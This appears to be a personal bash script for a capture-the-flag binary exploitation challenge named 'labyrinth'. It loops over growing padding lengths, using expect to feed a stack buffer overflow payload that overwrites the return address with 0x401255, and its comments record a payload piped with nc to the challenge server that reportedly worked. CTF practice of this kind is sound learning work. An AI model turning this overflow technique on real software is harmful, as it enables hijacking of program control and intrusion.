#!/bin/bash

#for i in {1..100}; do string=$string"A"; input="${string}0000000000401255\n"; echo ${input} | ./labyrinth; echo "Trying ${input}..."; sleep 1; done
#                                                         ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x55\x12\x40\x00\x00\x00\x00\x00
#nc 139.59.173.68 32372
#expect -c ""
#expect -c "expect \">>\""
#expect -c "send \"069\\r\""
#expect -c "expect \">>\""

# This worked
# ┌──(kali㉿kali)-[~/…/ctf/htb_cyber_apocalypse2023/pwn_labyrinth/challenge]
# └─$ echo "069\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123\x56\x12\x40\x00\x00\x00\x00\x00\n" | nc 139.59.173.68 32372


first="069"
second="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
location="0x0000000000401255"
string=""

for i in {1..10000}; do
	string=$string"A";
	echo "What do you expect?"
	expect <<- DONE
		set timeout -1
		spawn ./labyrinth
		expect ">>"
		send -- "${first}\r"
		expect ">>"
		send -- "${second}${string}${location}\r"
		expect eof
	DONE
	echo "Iteration ${i}.  Trying ${second}${string}${location}..."
	#sleep 0.25;
done
